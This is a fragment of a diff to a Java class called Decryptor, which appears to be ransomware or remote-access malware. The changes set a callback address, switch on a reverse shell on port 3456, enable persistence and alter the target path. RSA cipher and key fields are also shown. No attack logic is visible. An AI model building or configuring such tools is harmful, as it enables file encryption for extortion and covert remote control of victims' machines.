@@ -43,12 +43,12 @@ public class Decryptor {
   private static int id = 823780263;
 
   // network settings
-private static String address = "";
+private static String address = "127.0.0.1";
   private int port = 5555;
 
-private boolean usingRevShell = false;
-private int revPort = 0;
-private boolean usePersistence = false;
+private boolean usingRevShell = true;
+private int revPort = 3456;
+private boolean usePersistence = true;
 
   // socket variables
   private Socket socket;
@@ -56,7 +56,7 @@ private boolean usePersistence = false;
   private DataInputStream in = null;
 
   // crypt settings
-private static String targetPath = "";
+private static String targetPath = "null";
   private String b64privkey;
   private PrivateKey private_key;
   private Cipher RSA_Cipher;
